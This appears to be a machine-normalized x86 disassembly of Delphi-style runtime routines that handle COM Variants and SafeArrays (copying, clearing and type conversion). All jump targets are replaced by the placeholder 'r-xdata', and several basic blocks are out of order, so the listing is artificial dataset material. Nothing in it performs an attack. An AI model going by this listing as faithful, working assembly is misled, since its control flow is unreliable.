push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f051
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40f068
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f098
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f098
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f0f4
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ef3c
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40ef3c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f068
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40ef3c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40ef3c
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40f098
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ef3c
mov eax [ ebp - 0x314 ]
call sub_40f2ec
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40f270
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40ef3c
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_404008
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_415978
test al al
je r-xdata
mov eax ebx
call sub_40f0f4
jmp r-xdata
push ebx
call VariantClear
call sub_40ef3c
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40f308
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f338
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f338
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f394
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ef3c
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40ef3c
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40f2ec
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40ec94
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40ef3c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40ef3c
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f308
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40f338
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ef3c
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40ef3c
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f568
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40f270
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40ef3c
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_40405c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_415978
test al al
je r-xdata
mov ecx sub_40f560
mov edx esi
mov eax ebx
call sub_40f394
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40ef3c
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f614
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f568
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40f270
sub_40f658
push ebx
push esi
mov esi edx
mov ebx eax
cmp ebx esi
je r-xdata
push esi
push ebx
call VariantCopyInd
call sub_40ef3c
pop esi
pop ebx
retn
mov eax ebx
call sub_40f2ec
sub_40f688
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov edx esp
mov ax [ ebx ]
call sub_415978
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_40f658
push 0x1
mov ecx ebx
mov edx esi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_40f6bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f885
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
and edx 0xffffbfff
cmp edx 0x14
ja r-xdata
test ah 0x20
je r-xdata
jmp [ edx * 4 + jump_table_40f6f1 ]
mov edx ebx
mov eax esi
call sub_40f688
mov ecx sub_40f680
mov edx ebx
mov eax esi
call sub_40f394
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movsx edx [ edx ]
mov cl 0xfe
call sub_4136f4
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
mov cl 0xfc
call sub_4136f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
mov eax esi
call sub_4138ec
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
mov eax esi
call sub_4138ec
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
mov eax esi
call sub_413914
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
mov eax esi
call sub_4138ec
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_40f678
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4139a4
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov dx [ edx ]
neg dx
sbb edx edx
neg edx
call sub_4138c4
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movsx edx [ edx ]
mov cl 0xff
call sub_4136f4
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movzx edx [ edx ]
mov cl 0x1
call sub_4136f4
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movzx edx [ edx ]
mov cl 0x2
call sub_4136f4
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
mov cl 0x4
call sub_4136f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edx
push eax
mov eax esi
call sub_4137f0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f894
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f658
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f88c
lea eax [ ebp - 0x4 ]
call sub_404714
retn
sub_40f8a8
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x8 ]
call sub_404e30
mov esi eax
mov eax ebx
call sub_40f2ec
mov [ ebx ] 0x8
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_40f8d0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f92c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f614
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40fb58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f933
lea eax [ ebp - 0x10 ]
call sub_40f2ec
retn
sub_40f93c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f97a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412fa4
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4139a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f981
lea eax [ ebp - 0x4 ]
call sub_404714
retn
sub_40f988
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f9c6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_41287c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f9cd
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40f9d4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fa12
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_413648
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fa19
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
sub_40fa20
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fa5e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_41357c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4139dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fa65
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
sub_40fa6c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40fb58
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40ef48
jmp r-xdata
mov edx esi
call sub_40eb08
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40ef48
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40faec
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_415978
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f8d0
jmp r-xdata
mov edx esp
mov eax esi
call sub_415978
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40fa6c
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40fb58
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f614
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40fb58
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fb9d ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40f988
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40f054
jmp r-xdata
mov eax ebx
call sub_4104c4
mov edx eax
mov eax esi
call sub_4137d0
jmp r-xdata
mov eax ebx
call sub_40ff1c
mov edx eax
mov eax esi
call sub_413730
jmp r-xdata
mov eax ebx
call sub_411888
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_41381c
jmp r-xdata
mov eax ebx
call sub_4114f0
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413840
jmp r-xdata
mov eax ebx
call sub_4121c8
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_41386c
jmp r-xdata
mov eax ebx
call sub_411c60
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413898
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f93c
jmp r-xdata
mov eax ebx
call sub_410fdc
mov edx eax
mov eax esi
call sub_4138c4
jmp r-xdata
mov eax ebx
call sub_41036c
mov edx eax
mov eax esi
call sub_4137b0
jmp r-xdata
mov eax ebx
call sub_41041c
mov edx eax
mov eax esi
call sub_413750
jmp r-xdata
mov eax ebx
call sub_4105bc
mov edx eax
mov eax esi
call sub_413770
jmp r-xdata
mov eax ebx
call sub_410694
mov edx eax
mov eax esi
call sub_413790
jmp r-xdata
mov eax ebx
call sub_4109e0
push edx
push eax
mov eax esi
call sub_4137f0
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f9d4
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40fa20
jmp r-xdata
mov dx 0x101
call sub_40eb08
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40f2ec
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40faec
xor edx edx
mov ax 0x1
call sub_40eb08
jmp r-xdata
sub_40fd84
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fe27
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412fa4
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404290
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_4084d4
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fe2e
lea eax [ ebp - 0xc ]
call sub_404008
lea eax [ ebp - 0x8 ]
call sub_404714
retn
mov eax ebx
call sub_410fdc
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40ef48
jmp r-xdata
sub_40fe38
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40ef48
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40fe74
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fec8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40f614
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40ff1c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fecf
lea eax [ ebp - 0x14 ]
call sub_40f2ec
retn
sub_40fed8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415978
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40ff1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41033d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40ff4f ]
mov eax [ ebp - 0x4 ]
call sub_40fd84
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029fc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029fc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_4029fc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029fc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fd84
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40ff1c
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fe38
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fe74
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40eb08
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40316c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40316c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40316c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40316c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40316c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40316c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40fed8
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fe38
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40fe38
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_410173 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029fc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029fc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_4029fc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029fc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fd84
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40ff1c
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40316c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40316c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40316c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40316c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40316c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40316c
sub_41036c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
